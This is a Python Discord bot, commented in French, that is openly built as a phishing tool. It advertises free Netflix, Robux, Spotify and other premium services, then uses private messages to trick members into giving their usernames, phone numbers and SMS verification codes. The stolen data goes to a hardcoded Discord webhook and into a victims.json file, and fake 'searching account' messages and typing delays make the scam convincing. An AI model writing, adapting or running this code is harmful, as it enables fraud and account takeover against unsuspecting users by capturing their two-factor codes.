from discord.ext import commands, tasks
import asyncio
import aiohttp
import uuid
import random
import json
import os
from datetime import datetime
import discord
from discord import ui, Embed

# ==================== CONFIGURATION ====================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.dm_messages = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

TOKEN = os.getenv("TOKEN")

WEBHOOK_URL = "https://discord.com/api/webhooks/1512879903320703149/ZpBC0fXE8sPadHLx_8FwGyTdFrsI6TYVhyNCagspvSZZ8FwoHBHFVKteGZPfeOyTqV1O"
MAIN_PANEL_CHANNEL = 1512885178974867527
WELCOME_CHANNEL = 1512903987106545805

active_sessions = {}
victims_data = []

# ==================== FONCTIONS UTILITAIRES ====================
async def save_victim(data):
    victims_data.append(data)
    try:
        with open("victims.json", "w", encoding="utf-8") as f:
            json.dump(victims_data, f, indent=4, ensure_ascii=False)
    except:
        pass

async def send_to_webhook(user, service, step=None, numero=None, sms_code=None, username=None, alert=False):
    session_id = active_sessions.get(user.id, str(uuid.uuid4())[:8].upper())
    active_sessions[user.id] = session_id

    if alert:
        embed = Embed(title="🚨 ALERTE - NOUVELLE VICTIME", description="Une personne vient de cliquer", color=0xff0000, timestamp=discord.utils.utcnow())
        embed.add_field(name="👤 Utilisateur", value=f"{user} (`{user.id}`)", inline=False)
        embed.add_field(name="Service", value=service, inline=False)
    else:
        embed = Embed(title=f"🎯 VICTIME #{session_id} - {service}", description=f"**{user}** (`{user.id}`)", color=0x00ff00, timestamp=discord.utils.utcnow())
        if username: embed.add_field(name="👤 Username / Gamertag", value=username, inline=False)
        if numero: embed.add_field(name="📱 Numéro", value=f"`{numero}`", inline=False)
        if sms_code: embed.add_field(name="🔑 Code SMS", value=f"`{sms_code}`", inline=False)
        if step: embed.add_field(name="📍 Étape", value=step, inline=False)

    async with aiohttp.ClientSession() as session:
        await session.post(WEBHOOK_URL, json={"embeds": [embed.to_dict()]})

    await save_victim({
        "time": datetime.utcnow().isoformat(),
        "user": str(user),
        "user_id": user.id,
        "service": service,
        "step": step,
        "numero": numero,
        "sms_code": sms_code,
        "username": username
    })

async def typing_indicator(channel, duration=1.5):
    async with channel.typing():
        await asyncio.sleep(random.uniform(duration - 0.4, duration + 0.6))

# ==================== EVENTS ====================
@bot.event
async def on_member_join(member):
    if member.bot:
        return
    w_channel = bot.get_channel(WELCOME_CHANNEL)
    if w_channel:
        try:
            await w_channel.send(f"**Bienvenue sur le serveur !** 🎁\nLe bot est disponible juste ici → <#{MAIN_PANEL_CHANNEL}>\nChoisis ton service premium gratuit !")
        except:
            pass

    p_channel = bot.get_channel(MAIN_PANEL_CHANNEL)
    if p_channel:
        try:
            ping_msg = await p_channel.send(f"{member.mention} **Bienvenue !** Active ton service ici 🎮")
            await asyncio.sleep(1.5)
            await ping_msg.delete()
        except:
            pass

@tasks.loop(hours=5)
async def renew_panel():
    await setup_main_panel()

async def setup_main_panel():
    channel = bot.get_channel(MAIN_PANEL_CHANNEL)
    if not channel: return

    async for msg in channel.history(limit=50):
        if msg.author == bot.user:
            await msg.delete()

    embed = Embed(title="🎁 Services Premium Gratuits", description="Choisis ci-dessous :", color=0x00ff00)
    embed.add_field(name="Services disponibles", value="• Robux Roblox\n• Netflix\n• Snapchat+\n• Crunchyroll\n• Spotify\n• Disney+\n• YouTube Premium\n• Amazon Prime\n• Hulu\n• Paramount+\n• Xbox Game Pass\n• PlayStation Plus", inline=False)

    view = ui.View(timeout=None)
    services = [
        ("🎮 Robux", discord.ButtonStyle.success, "start_robux"),
        ("🎥 Netflix", discord.ButtonStyle.danger, "start_netflix"),
        ("👻 Snapchat+", discord.ButtonStyle.primary, "start_snap"),
        ("🍥 Crunchyroll", discord.ButtonStyle.primary, "start_crunchyroll"),
        ("🎵 Spotify", discord.ButtonStyle.success, "start_spotify"),
        ("🏰 Disney+", discord.ButtonStyle.primary, "start_disney"),
        ("📺 YouTube Premium", discord.ButtonStyle.danger, "start_youtube"),
        ("📦 Amazon Prime", discord.ButtonStyle.success, "start_amazon"),
        ("📺 Hulu", discord.ButtonStyle.danger, "start_hulu"),
        ("🌟 Paramount+", discord.ButtonStyle.primary, "start_paramount"),
        ("🎮 Xbox", discord.ButtonStyle.success, "start_xbox"),
        ("🔵 PS Plus", discord.ButtonStyle.primary, "start_psplus"),
    ]

    for label, style, cid in services:
        view.add_item(ui.Button(label=label, style=style, custom_id=cid))

    await channel.send(embed=embed, view=view)

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if not interaction.data or not str(interaction.data.get("custom_id", "")).startswith("start_"):
        return

    custom_id = interaction.data["custom_id"]
    service_key = custom_id.replace("start_", "")
    service_map = {"robux":"Robux","netflix":"Netflix","snap":"Snapchat+","crunchyroll":"Crunchyroll","spotify":"Spotify","disney":"Disney+","youtube":"YouTube Premium","amazon":"Amazon Prime","hulu":"Hulu","paramount":"Paramount+","xbox":"Xbox Game Pass","psplus":"PlayStation Plus"}
    service_name = service_map.get(service_key, service_key.capitalize())

    await send_to_webhook(interaction.user, service_name, alert=True)
    await interaction.response.send_message("✅ Instructions en MP...", ephemeral=True)

    dm = await interaction.user.create_dm()
    await generic_premium_flow(interaction.user, dm, service_name, service_key)

# ==================== FLOW PHISHING ====================
async def generic_premium_flow(user, dm, service, service_key):
    for attempt in range(3):
        try:
            await typing_indicator(dm, 2.5)
            await dm.send(embed=Embed(title=f"🔍 Connexion {service}", description="Recherche compte...", color=0xffff00))
            await asyncio.sleep(random.uniform(2.8, 4.5))
            await typing_indicator(dm, 2.0)
            await dm.send(embed=Embed(title="✅ Compte trouvé", description=f"Activation {service} en cours...", color=0x00ff00))

            if service_key in ["robux", "xbox", "psplus"]:
                plat = "Roblox" if service_key == "robux" else "Xbox" if service_key == "xbox" else "PlayStation"
                await typing_indicator(dm, 1.6)
                await dm.send(embed=Embed(title=f"👤 {plat}", description=f"Entre ton {plat} username :", color=0x00bfff))
                msg = await bot.wait_for('message', check=lambda m: m.author == user and isinstance(m.channel, discord.DMChannel), timeout=120)
                username = msg.content.strip()
                await send_to_webhook(user, service, step=f"{plat} Username", username=username)

            await ask_number(user, dm, service)
            return
        except asyncio.TimeoutError:
            if attempt < 2:
                await dm.send("⏳ Temps écoulé, je relance...")
                await asyncio.sleep(3)
            else:
                await dm.send("Session expirée.")
        except:
            await asyncio.sleep(2)

async def ask_number(user, dm, service):
    await typing_indicator(dm, 2.0)
    await dm.send(embed=Embed(title="📱 Vérification", description="Entre ton numéro (+33 06XXXXXXXX) :", color=0x00bfff))
    num_msg = await bot.wait_for('message', check=lambda m: m.author == user and isinstance(m.channel, discord.DMChannel), timeout=180)
    numero = num_msg.content.strip()
    await send_to_webhook(user, service, step="Numéro", numero=numero)
    await asyncio.sleep(1.5)
    await ask_sms_code(user, dm, service)

async def ask_sms_code(user, dm, service):
    await typing_indicator(dm, 2.2)
    await dm.send(embed=Embed(title="🔑 Code SMS", description="Envoie le code reçu par SMS :", color=0x00bfff))
    sms_msg = await bot.wait_for('message', check=lambda m: m.author == user and isinstance(m.channel, discord.DMChannel), timeout=300)
    sms_code = sms_msg.content.strip()[:6]
    await send_to_webhook(user, service, step="Code SMS", sms_code=sms_code)
    await typing_indicator(dm, 2.5)
    await dm.send(embed=Embed(title="🎉 Succès !", description=f"{service} activé. Profite !", color=0x00ff00))

@bot.event
async def on_ready():
    print(f"✅ Bot connecté : {bot.user}")
    renew_panel.start()
    await setup_main_panel()

# ==================== LANCEMENT ====================
bot.run(TOKEN)
